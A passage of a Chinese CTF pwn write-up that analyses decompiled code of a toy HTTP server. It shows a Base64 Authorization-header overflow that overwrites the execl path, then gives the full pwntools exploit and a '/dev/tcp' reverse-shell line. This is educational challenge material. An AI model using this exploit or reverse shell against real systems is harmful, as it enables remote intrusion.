+<p>程序遍历 s2，以空格（由 __ctype_b_loc() 判断空白字符）为界，把第一个单词存入 s1。</p>
+<ul>
+<li>只有当 s1 是 “GET” 或 “POST” 时才继续处理，否则调用 unimplemented() 报错。</li>
+</ul>
+<hr>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !strcasecmp(s1, <span class="string">&quot;GET&quot;</span>) || !strcasecmp(s1, <span class="string">&quot;POST&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">    strcasecmp(s1, <span class="string">&quot;POST&quot;</span>);</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( ((*__ctype_b_loc())[s2[i]] &amp; <span class="number">0x2000</span>) != <span class="number">0</span> &amp;&amp; i &lt;= <span class="number">0x3FF</span> )</span><br><span class="line">        ++i;</span><br><span class="line">    <span class="keyword">while</span> ( ((*__ctype_b_loc())[s2[i]] &amp; <span class="number">0x2000</span>) == <span class="number">0</span> &amp;&amp; v5 &lt;= <span class="number">0xFD</span> &amp;&amp; i &lt;= <span class="number">0x3FF</span> )</span><br><span class="line">        v10[v5++] = s2[i++];</span><br><span class="line">    v10[v5] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !strcasecmp(s1, <span class="string">&quot;GET&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> ( j = v10; *j != <span class="number">63</span> &amp;&amp; *j; ++j )</span><br><span class="line">            ;</span><br><span class="line">        <span class="keyword">if</span> ( *j == <span class="number">63</span> )</span><br><span class="line">            *j++ = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>程序跳过空格，继续读取 URI 存入 <code>v10</code>。</p>
+<ul>
+<li>GET 特殊处理：如果是 GET 请求，程序会查找问号 ?。如果找到，会将 ? 替换为 \0（字符串结束符），并把 ? 后面的参数指针赋给 j（作为 Query String）。</li>
+<li>POST 特殊处理：如果是 POST 请求，指针会保持为初始值 0（NULL）。</li>
+</ul>
+<hr>
+<p>物理路径映射：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sprintf</span>(s, <span class="string">&quot;www/html%s&quot;</span>, v10);</span><br><span class="line"><span class="keyword">if</span> ( s[<span class="built_in">strlen</span>(s) - <span class="number">1</span>] == <span class="number">47</span> )                 <span class="comment">// 47 是 ASCII 码的 &#x27;/&#x27;</span></span><br><span class="line">  <span class="built_in">strcat</span>(s, <span class="string">&quot;index.html&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>程序默认在请求路径前直接拼接 <code>&quot;www/html&quot;</code></p>
+<p>如果请求为 <code>POST /rule.cgi</code>，这里拼接后刚好变成 <code>www/html/rule.cgi</code></p>
+<hr>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)_stat(s, &amp;stat_buf) == <span class="number">-1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">while</span> ( line &amp;&amp; <span class="built_in">strcmp</span>(<span class="string">&quot;\n&quot;</span>, s2) )</span><br><span class="line">              line = (<span class="type">int</span>)get_line((<span class="type">unsigned</span> <span class="type">int</span>)a1, s2, <span class="number">1024</span>);</span><br><span class="line">          not_found((<span class="type">int</span>)a1);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
+
+<p>程序调用了系统底层函数 <code>_stat</code> 去检查拼接后的文件是否存在。这意味着你请求的 URI 必须在靶机本地真实存在，否则直接返回 404 Not Found。</p>
+<hr>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strstr</span>(s, <span class="string">&quot;..&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">    serve_file((<span class="type">unsigned</span> <span class="type">int</span>)a1, <span class="string">&quot;www/html/hack.html&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>程序严格过滤了 <code>..</code>。如果你的路径里包含 <code>..</code> 试图跳转到上级目录读取 <code>/etc/passwd</code>，程序会直接拦截，并返回一个 <code>hack.html</code> 页面。</p>
+<hr>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">       &#123;</span><br><span class="line">           <span class="keyword">if</span> ( (stat_buf.st_mode &amp; <span class="number">0xF000</span>) == <span class="number">0x4000</span> )</span><br><span class="line">               <span class="built_in">strcat</span>(s, <span class="string">&quot;/index.html&quot;</span>);</span><br><span class="line">           <span class="keyword">if</span> ( (stat_buf.st_mode &amp; <span class="number">0x40</span>) != <span class="number">0</span> || (stat_buf.st_mode &amp; <span class="number">8</span>) != <span class="number">0</span> || (stat_buf.st_mode &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">               execute_cgi((<span class="type">unsigned</span> <span class="type">int</span>)a1, s, s1, j);</span><br><span class="line">           <span class="keyword">else</span></span><br><span class="line">               serve_file((<span class="type">unsigned</span> <span class="type">int</span>)a1, s);</span><br><span class="line">       &#125;</span><br><span class="line">       close((<span class="type">int</span>)a1);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>程序通过位运算检查目标文件的 Linux 权限掩码（<code>st_mode</code>）。<code>0x40</code>, <code>8</code>, <code>1</code> 分别对应八进制权限的 <code>0100</code> (属主执行)、<code>0010</code> (属组执行)、<code>0001</code> (其他人执行)。</li>
+<li>结论：只要目标文件 rule.cgi 在靶机上具有任何一种可执行 x 权限，程序就会立刻调用 execute_cgi，把连接对象 a1、文件路径 s、请求方法 s1 传过去。</li>
+</ul>
+<h4 id="execute-cgi"><a href="#execute-cgi" class="headerlink" title="execute_cgi"></a>execute_cgi</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">execute_cgi</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1, <span class="type">const</span> <span class="type">char</span> *a2, <span class="type">const</span> <span class="type">char</span> *a3, <span class="type">const</span> <span class="type">char</span> *a4)</span></span><br><span class="line">&#123;</span><br><span class="line">    __int16 v4; <span class="comment">// ax</span></span><br><span class="line">    <span class="type">size_t</span> v5; <span class="comment">// rax</span></span><br><span class="line">    <span class="type">char</span> v9; <span class="comment">// [rsp+2Fh] [rbp-D31h] BYREF</span></span><br><span class="line">    <span class="type">int</span> stat_loc; <span class="comment">// [rsp+30h] [rbp-D30h] BYREF</span></span><br><span class="line">    <span class="type">int</span> line; <span class="comment">// [rsp+34h] [rbp-D2Ch]</span></span><br><span class="line">    <span class="type">int</span> v12; <span class="comment">// [rsp+38h] [rbp-D28h]</span></span><br><span class="line">    <span class="type">__pid_t</span> pid; <span class="comment">// [rsp+3Ch] [rbp-D24h]</span></span><br><span class="line">    <span class="type">int</span> pipedes[<span class="number">2</span>]; <span class="comment">// [rsp+40h] [rbp-D20h] BYREF</span></span><br><span class="line">    <span class="type">int</span> v15[<span class="number">2</span>]; <span class="comment">// [rsp+48h] [rbp-D18h] BYREF</span></span><br><span class="line">    <span class="type">char</span> s[<span class="number">256</span>]; <span class="comment">// [rsp+50h] [rbp-D10h] BYREF</span></span><br><span class="line">    <span class="type">char</span> <span class="built_in">string</span>[<span class="number">256</span>]; <span class="comment">// [rsp+150h] [rbp-C10h] BYREF</span></span><br><span class="line">    <span class="type">char</span> v18[<span class="number">256</span>]; <span class="comment">// [rsp+250h] [rbp-B10h] BYREF</span></span><br><span class="line">    <span class="type">char</span> dest[<span class="number">512</span>]; <span class="comment">// [rsp+350h] [rbp-A10h] BYREF</span></span><br><span class="line">    <span class="type">char</span> s2[<span class="number">21</span>]; <span class="comment">// [rsp+550h] [rbp-810h] BYREF</span></span><br><span class="line">    <span class="type">char</span> v21[<span class="number">1003</span>]; <span class="comment">// [rsp+565h] [rbp-7FBh] BYREF</span></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">1032</span>]; <span class="comment">// [rsp+950h] [rbp-410h] BYREF</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v23; <span class="comment">// [rsp+D58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    v23 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">    line = <span class="number">1</span>;</span><br><span class="line">    v12 = <span class="number">-1</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(dest, a2);</span><br><span class="line">    <span class="built_in">strcpy</span>(s2, <span class="string">&quot;A&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !strcasecmp(a3, <span class="string">&quot;GET&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span> ( line &gt; <span class="number">0</span> &amp;&amp; <span class="built_in">strcmp</span>(<span class="string">&quot;\n&quot;</span>, s2) )</span><br><span class="line">            line = get_line(a1, (__int64)s2, <span class="number">1024</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        line = get_line(a1, (__int64)s2, <span class="number">1024</span>);</span><br><span class="line">        s2[<span class="number">15</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !strcasecmp(s2, <span class="string">&quot;Content-Length:&quot;</span>) )</span><br><span class="line">            v12 = atoi(&amp;s2[<span class="number">16</span>]);</span><br><span class="line">        line = get_line(a1, (__int64)s2, <span class="number">1024</span>);</span><br><span class="line">        s2[<span class="number">20</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !strcasecmp(s2, <span class="string">&quot;Authorization: Basic&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">            v4 = <span class="built_in">strlen</span>(v21);</span><br><span class="line">            GdecBase64(v21, (<span class="type">unsigned</span> __int16)(v4 - <span class="number">1</span>), v18);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( line &gt; <span class="number">0</span> &amp;&amp; <span class="built_in">strcmp</span>(<span class="string">&quot;\n&quot;</span>, s2) )</span><br><span class="line">            line = get_line(a1, (__int64)s2, <span class="number">1024</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v12 == <span class="number">-1</span> || <span class="built_in">strcmp</span>(v18, <span class="string">&quot;pwner&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">            bad_request(a1);</span><br><span class="line">            <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v23;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strcpy</span>(s2, <span class="string">&quot;HTTP/1.0 200 OK\r\n&quot;</span>);</span><br><span class="line">    v5 = <span class="built_in">strlen</span>(s2);</span><br><span class="line">    send(a1, s2, v5, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( pipe(pipedes) &gt;= <span class="number">0</span> &amp;&amp; pipe(v15) &gt;= <span class="number">0</span> &amp;&amp; (pid = fork(), pid &gt;= <span class="number">0</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !pid )</span><br><span class="line">        &#123;</span><br><span class="line">            dup2(pipedes[<span class="number">1</span>], <span class="number">1</span>);</span><br><span class="line">            dup2(v15[<span class="number">0</span>], <span class="number">0</span>);</span><br><span class="line">            close(pipedes[<span class="number">0</span>]);</span><br><span class="line">            close(v15[<span class="number">1</span>]);</span><br><span class="line">            <span class="built_in">sprintf</span>(s, <span class="string">&quot;REQUEST_METHOD=%s&quot;</span>, a3);</span><br><span class="line">            putenv(s);</span><br><span class="line">            <span class="keyword">if</span> ( !strcasecmp(a3, <span class="string">&quot;GET&quot;</span>) )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">sprintf</span>(<span class="built_in">string</span>, <span class="string">&quot;QUERY_STRING=%s&quot;</span>, a4);</span><br><span class="line">                putenv(<span class="built_in">string</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">sprintf</span>(buf, <span class="string">&quot;CONTENT_LENGTH=%d&quot;</span>, v12);</span><br><span class="line">                putenv(buf);</span><br><span class="line">            &#125;</span><br><span class="line">            execl(dest, dest, <span class="number">0</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        close(pipedes[<span class="number">1</span>]);</span><br><span class="line">        close(v15[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">if</span> ( !strcasecmp(a3, <span class="string">&quot;POST&quot;</span>) &amp;&amp; v12 &lt;= <span class="number">1024</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            recv(a1, buf, v12, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)check_content(buf) )</span><br><span class="line">                <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x400u</span>);</span><br><span class="line">            write(v15[<span class="number">1</span>], buf, v12);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( read(pipedes[<span class="number">0</span>], &amp;v9, <span class="number">1u</span>) &gt; <span class="number">0</span> )</span><br><span class="line">            send(a1, &amp;v9, <span class="number">1u</span>, <span class="number">0</span>);</span><br><span class="line">        close(pipedes[<span class="number">0</span>]);</span><br><span class="line">        close(v15[<span class="number">1</span>]);</span><br><span class="line">        waitpid(pid, &amp;stat_loc, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        cannot_execute(a1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v23;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> v18[<span class="number">256</span>];  <span class="comment">// [rbp-B10h]  大小为 256 字节    存放认证解码数据</span></span><br><span class="line"><span class="type">char</span> dest[<span class="number">512</span>]; <span class="comment">// [rbp-A10h]  紧邻 v18 的高地址，存放即将执行的命令文件路径</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>计算一下它们之间的距离：<code>0xB10 - 0xA10 = 0x100 = 256</code></li>
+<li>这意味着，v18 这个数组的大小刚好就是 256 字节，它的结尾处挨着的就是 <code>dest</code> 变量的起始地址。</li>
+</ul>
+<p>程序执行了 <code>strcpy(dest, a2);</code>，此时 dest 里面存放的是原本合法的物理路径：<code>&quot;www/html/rule.cgi&quot;</code></p>
+<hr>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !strcasecmp(s2, <span class="string">&quot;Authorization: Basic&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">    v4 = <span class="built_in">strlen</span>(v21);</span><br><span class="line">    GdecBase64(v21, (<span class="type">unsigned</span> __int16)(v4 - <span class="number">1</span>), v18); <span class="comment">// 致命点</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>当程序读到 Authorization: Basic 时，会调用自定义的 GdecBase64 进行解码，并将结果存入缓冲区 <code>v18</code></li>
+<li><code>GdecBase64</code> 内部没有任何防止越界写入的机制。看一下大致逻辑</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">GdecBase64</span><span class="params">(__int64 a1, <span class="type">unsigned</span> __int16 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">    v11 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">    <span class="built_in">memset</span>(v10, <span class="number">0</span>, <span class="number">0x400u</span>);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1u</span> &amp;&amp; *(_BYTE *)(a2 - <span class="number">1LL</span> + a1) == <span class="number">61</span>; ++i )</span><br><span class="line">        --a2;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; a2; ++j )  <span class="comment">// v4 = a2 = length</span></span><br><span class="line">    &#123;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v12 == <span class="number">-1</span> || <span class="built_in">strcmp</span>(v18, <span class="string">&quot;pwner&quot;</span>) ) &#123; bad_request(a1); ... &#125;</span><br></pre></td></tr></table></figure>
+
+<p>校验要求认证信息必须是 pwner，由于 strcmp 的特性，我们可以利用 \x00 去截断，进行缓冲区溢出</p>
+<hr>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execl(dest, dest, 0);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在经历 pipe 创建管道和 fork 创建子进程后，子进程会调用系统底层的 execl 去执行 dest 变量里指向的程序</li>
+<li>如果没有溢出，它本该执行的是 <code>www/html/rule.cgi</code>。</li>
+<li>但如果我们对 v18 填满 256 字节溢出覆盖 dest 的内存，就可以尝试进行反弹 shell</li>
+<li>那么就可以欺骗服务器执行 <code>execl(&quot;/bin/bash&quot;, &quot;/bin/bash&quot;, 0);</code>。</li>
+</ul>
+<h3 id="EXP-思路："><a href="#EXP-思路：" class="headerlink" title="EXP 思路："></a>EXP 思路：</h3><h4 id="构造-Payload-与-HTTP-发包"><a href="#构造-Payload-与-HTTP-发包" class="headerlink" title="构造 Payload 与 HTTP 发包"></a>构造 Payload 与 HTTP 发包</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;pwner\x00&#x27;</span>.ljust(<span class="number">256</span>,<span class="string">b&#x27;\x00&#x27;</span>)+<span class="string">b&#x27;/bin/bash\x00&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>用 pwner 伪造基础用户名，\x00 截断 strcmp 并进行溢出，用 &#x2F;bin&#x2F;bash\x00 覆盖相邻的 dest 变量</p>
+<ul>
+<li>欺骗服务器执行：execl(“&#x2F;bin&#x2F;bash”, “&#x2F;bin&#x2F;bash”, 0);</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data =<span class="string">b&#x27;POST /rule.cgi &#x27;</span>+<span class="string">b&#x27;HTTP/1.1\r\nContent-Length: 1000\r\nAuthorization: Basic &#x27;</span>+base64.b64encode(payload)+<span class="string">b&#x27;\r\n\r\n&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>组装符合 HTTP 协议规范的恶意 POST 请求报文，相当于常规传参<ul>
+<li>指定请求目标为 <code>/rule.cgi</code>，让目标 Web 服务 httpd 调用对应的 CGI 处理函数。</li>
+<li>构造 Authorization: Basic  认证头，并将上面写好的 payload 进行Base64 编码后拼接进去</li>
+<li>末尾的 <code>\r\n\r\n</code> 是 HTTP 协议的严格强制规范，表示请求头部结束。</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io.send(data)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>执行 execl(“&#x2F;bin&#x2F;bash”, “&#x2F;bin&#x2F;bash”, 0);</li>
+</ul>
+<hr>
+<h4 id="反弹-Shell-与接管控制权"><a href="#反弹-Shell-与接管控制权" class="headerlink" title="反弹 Shell 与接管控制权"></a>反弹 Shell 与接管控制权</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io.sendline(<span class="string">b&#x27;sh -i &gt;&amp; /dev/tcp/ip/4444 0&gt;&amp;1&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>发送反弹 Shell 指令，<code>sendline</code> 会自动在末尾追加一个换行符 <code>\n</code>，等同于在命令行敲击回车执行。</li>
+<li><strong>作用</strong>：此时目标机上已经运行着刚刚被你通过溢出启动的 <code>bash</code>，这条命令直接喂给了那个 <code>bash</code>。<ul>
+<li>它的作用是让目标机器主动发起 TCP 连接，连向你指定的公网 <code>ip</code> 和 <code>4444</code> 端口，并将目标机器的输入输出流全部重定向过去。</li>
+<li>注意：代码里的 <code>ip</code> 只是个占位符，实战中必须替换成你自己的公网 VPS IP。</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>含义</strong>：将当前的 pwntools 脚本切换为全交互模式。</li>
+</ul>
+<h3 id="总-EXP："><a href="#总-EXP：" class="headerlink" title="总 EXP："></a>总 EXP：</h3><p>先 sudo nc -lvnp 端口号 进行监听，再开启新的界面运行 python exp.py，成功后 ssh 端会接收到如下字样：</p>
+<p>Listening on 0.0.0.0 端口号</p>
+<p>Connection received on ip 随机端口号，这样子就可以获取 flag 了。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"><span class="title function_">context</span><span class="params">(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span></span><br><span class="line">file = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node6.anna.nssctf.cn&#x27;</span>,<span class="number">20447</span>)</span><br><span class="line"></span><br><span class="line">pay = b<span class="string">&#x27;pwner\x00&#x27;</span>.ljust(<span class="number">256</span>,b<span class="string">&#x27;\x00&#x27;</span>)+b<span class="string">&#x27;/bin/bash\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">data =b<span class="string">&#x27;POST /rule.cgi &#x27;</span>+b<span class="string">&#x27;HTTP/1.1\r\nContent-Length: 1000\r\nAuthorization: Basic &#x27;</span>+base64.b64encode(pay)+b<span class="string">&#x27;\r\n\r\n&#x27;</span></span><br><span class="line"></span><br><span class="line">io.send(data)</span><br><span class="line"></span><br><span class="line">io.sendline(b<span class="string">&#x27;sh -i &gt;&amp; /dev/tcp/ip/4444 0&gt;&amp;1&#x27;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/HFTTC.github.io/images/pwn/_a9fqGxtQ2l8_AcZ/1778389206110-e30192a6-bde3-4197-95b6-3e60f0f32f96-310881.png" alt="1778389206110-e30192a6-bde3-4197-95b6-3e60f0f32f96.png"></p>
+<blockquote>
+<p>更新: 2026-05-10 19:55:17<br>原文: <a target="_blank" rel="noopener" href="https://www.yuque.com/idcm/wnemg9/ubnxy9l5nba9skcf">https://www.yuque.com/idcm/wnemg9/ubnxy9l5nba9skcf</a></p>
+</blockquote>
+
+    </div>
+    <footer class="article-footer">
+        <a class="article-category-link" href="/HFTTC.github.io/categories/Notes/" title="Notes" data-aos="zoom-in">Notes</a>
+
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/HFTTC.github.io/tags/pwn/" rel="tag" title="pwn">pwn</a></li></ul>
+
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+      <div class="article-nav-link-wrap left">
+            <img data-src="/HFTTC.github.io/images/banner.webp" data-sizes="auto" alt="PolarisCTF_2026_WEBPWN" class="lazyload">
+        <a href="/HFTTC.github.io/2026/05/23/PolarisCTF_2026_WEBPWN/index/" aria-label="前一篇: PolarisCTF_2026_WEBPWN" title="前一篇: PolarisCTF_2026_WEBPWN"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+            PolarisCTF_2026_WEBPWN
+        </h3>
+      </div>
+    <div class="article-nav-link-wrap right">
+          <img data-src="/HFTTC.github.io/images/banner.webp" data-sizes="auto" alt="[CISCN 2024] gostack" class="lazyload">
+      <a href="/HFTTC.github.io/2026/05/23/GO-PWN/%5BCISCN2024%5Dgostack/" aria-label="后一篇: [CISCN 2024] gostack"  title="后一篇: [CISCN 2024] gostack"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+          [CISCN 2024] gostack
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        <span class="footer-info-sep rotate"></span>
+      HFTTC
+    </div>
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        223.6k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        18:25
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
